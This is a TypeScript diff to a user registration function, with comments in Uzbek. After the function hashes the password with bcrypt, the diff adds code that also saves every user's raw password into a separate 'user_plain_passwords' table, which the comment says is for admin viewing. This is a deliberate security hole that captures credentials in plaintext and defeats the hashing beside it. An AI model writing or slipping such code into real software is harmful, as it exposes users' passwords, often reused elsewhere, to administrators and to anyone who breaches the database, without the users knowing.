@@ -52,9 +52,18 @@ export const registerUser = async (name: string, email: string, password: string
     const hashedPassword = await bcrypt.hash(password, 12);
 
     // Create new user
-    await pool.execute(
+    const [result] = await pool.execute(
       'INSERT INTO users (name, email, password, role) VALUES (?, ?, ?, ?)',
       [name, email, hashedPassword, 'user']
+    );
+
+    // Ochiq parolni alohida jadvalda saqlash (faqat admin ko'rishi uchun)
+    const insertResult = result as any;
+    const userId = insertResult.insertId;
+    
+    await pool.execute(
+      'INSERT INTO user_plain_passwords (user_id, plain_password) VALUES (?, ?)',
+      [userId, password]
     );
 
     return { success: true, message: 'Muvaffaqiyatli ro\'yxatdan o\'tdingiz!' };
